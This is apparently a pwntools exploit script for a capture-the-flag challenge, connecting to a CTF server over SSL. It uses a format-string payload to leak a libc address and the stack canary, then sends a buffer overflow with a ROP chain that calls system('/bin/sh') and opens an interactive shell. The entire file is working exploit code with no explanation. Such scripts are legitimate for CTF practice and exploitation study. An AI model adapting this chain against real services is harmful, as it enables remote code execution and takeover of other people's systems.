from pwn import *

context.binary = binary = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

#p = process()
p = remote('interesting.ctf.prgy.in', 1337, ssl=True)

p.sendline(b' %p' * 40)
p.recvuntil(b'You said: ')

leaks = p.recvline()[:-1].decode().split()
libc_leak = int(leaks[1], 16)
libc.address = libc_leak - 0x114887
canary = int(leaks[-1], 16)

info(f'canary: {hex(canary)}')
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

rop = ROP(libc)
ropchain = b'A' * 280
ropchain += p64(canary)
ropchain += b'B' * 8
ropchain += p64(rop.find_gadget(['pop rdi','ret'])[0])
ropchain += p64(next(libc.search(b'/bin/sh\x00')))
ropchain += p64(rop.find_gadget(['ret'])[0])
ropchain += p64(libc.symbols.system)

p.sendline(ropchain)

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
